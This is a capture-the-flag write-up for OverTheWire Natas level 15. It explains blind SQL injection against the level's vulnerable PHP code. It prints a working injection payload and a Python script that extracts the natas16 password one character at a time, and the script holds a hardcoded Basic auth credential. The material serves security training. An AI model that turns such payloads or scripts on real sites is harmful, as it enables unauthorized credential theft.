# Level 15
Pushing things further, this level deals with Blind SQL injection. We'll make a python script as well.

##  Quest
We are presented with a simple page that checks if a user exists or not.
![Level 15 Image](./images/Level15.png)

Backend code is similar to previous level with some important changes
```php
<?
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }
    // If there is no error, we will get one of two response, depending on user input
    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```
<br/>
## Solution
From the source code, we can see that<br/>
 - Again <span id=yellow>unsanitized</span> user input is inserted into the query.<br/>
 - Although no output is displayed after query execution, we can make use of <span id=green>blind SQL injection</span>.<br/>
 - When query succeeds, we get _user exists_, and when it fails, we get _user doesn't exist_ msg.<br/>
 - Additionally, we can see that there is a debug parameter, which displays query on screen.<br/>
 - Lastly, there is a users table with `username` and `password` column.<br/>

Here is what was done.
1. Firstly, check if user `natas16` exist, it does, and we want its password.
2. Below is log from local linux lab to make use of `ascii` and `substring` functions to smuggle the password.<br/>


```sql
# Testing query in Lab
# Our Sample table
mysql> select * from books;
+---------+--------------+-----------+----------+
| book_id | name         | author    | released |
+---------+--------------+-----------+----------+
|       1 | Big Magic    | Elizabeth |        1 |
|       2 | Brown Farm   | AK        |        0 |
|       3 | Malgudi Days | R.K.N     |        1 |
+---------+--------------+-----------+----------+
3 rows in set (0.00 sec)

# We compare first character of author name with ascii code  
-- Below is a successful attempt
mysql> select * from books where name = 'Big Magic' and ASCII(SUBSTRING(author, 1, 1)) = 69;
+---------+-----------+-----------+----------+
| book_id | name      | author    | released |
+---------+-----------+-----------+----------+
|       1 | Big Magic | Elizabeth |        1 |
+---------+-----------+-----------+----------+
1 row in set (0.00 sec)

# Below is an unsuccessful attempt
mysql> select * from books where name = 'Big Magic' and ASCII(SUBSTRING(author, 1, 1)) = 70;
Empty set (0.00 sec)
```

Lets focus on second query
```sql
select * from books where name = 'Big Magic' and ASCII(SUBSTRING(author, 1, 1)) = 69;
```
`SUBSTRING(author, 1, 1)` refers to the first character and `ASCII` converts that first character to its ASCII code.
So, Above query will return a row if the ASCII code of first character of the name of author is equal to 69, i.e. E

Now we build our payload accordingly.<br/>
<span id=green>  Our payload -></span> `GET /index.php?username=natas16" AND ASCII(SUBSTRING(password,1,1))=65;#&debug=true HTTP/1.1`<br/>
Here, we are checking if the first character of password of user <u>natas16</u> has ascii code of 65 .i.e. its A<br/>

Below is screenshot of our failed attempt in Burp. (Note the response _user doesn't exist_)

![Level 15 solution](./images/Level15_solution.png)

Below is a successfull attempt, So our password begins with word 'W', ascii code 87. (Note the response _user exists_)

![Level 15.1 solution](./images/Level15.1_solution.png)

Instead of manually searching for password char by char, we use <span id=green>Burp intruder</span>.<br/>
We manually change `password(1,1)` -> `password(2,1)` for finding second character and so on. This process will repeat till we find all characters. Here password is 32 characters long. On 33rd attempt, intruder will not find any character and we know that we are done.

Intruder settings for the same are shown below
![Level 15.2 solution](./images/Level15.2_solution.png)

Intruder Payload settings are below. Now we start attack!.
![Level 15.3 solution](./images/Level15.3_solution.png)

Below is the screenshot of discovering the second password character.
![Level 14.4 solution](./images/Level15.4_solution.png)

We repeat this process 32 times to get the complete password for next Level.<br/><br/>It took me about an hour to smuggle password char by char with Burp community addition, so i decided to write a script to do the same, just for the fun of it.
<br/><br/>
This script does blind mysql injection till password is revealed
```python
 1 #!/usr/bin/env python3
 2
 3 import requests
 4 # Show have used auth, but it works for now.
 5 headers = {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
 6 proxy = {'http': 'http://localhost:8080'}
 7
 8 password = ""
 9 pos = 1
10
11 while True:
12     if password:
13         payload = f'natas16" AND password = \'{password}\' ;#'
14         data = {'username': payload}
15         response = requests.post('http://natas15.natas.labs.overthewire.org/', data=data, headers=headers, proxies=proxy)
16         if response.status_code == 200  and "This user exists" in response.text:
17             print(f"\r{password}", end='', flush=True)
18             break
19
20     for i in range(33,128):
21         print(f"\r{password}{chr(i)}", end='', flush=False)
22         payload = f'natas16" AND ASCII(SUBSTRING(password,{pos},1)) = {i};#'
23         data = {'username': payload}
24         response = requests.post('http://natas15.natas.labs.overthewire.org/', data=data, headers=headers, proxies=proxy)
25         if response.status_code == 200:
26             if 'This user exists.' in response.text:
27                 password += chr(i)
28                 print(f"\r{password}{chr(i)}", end='', flush=True)
29                 #print(password)
30                 break
31             elif "This user doesn't exist" in response.text:
32                 continue
33             elif i == 127:
34                 break
35             else:
36                 print('Program flow should not reach here. Exiting')
37                 #return 2
38         else:
39             print(f"Status code: {response.status}")
40     pos += 1
41 # todo: refactor the code
```
<br/>
I Added a cool effect that displays the found characters and also searches for next character.

Below is a sample run of the script

<img src="https://grey-fish.github.io/Natas/images/natas15.gif">

Thats all folks!

<br/>

[<< Back](https://grey-fish.github.io/Natas/index.html)
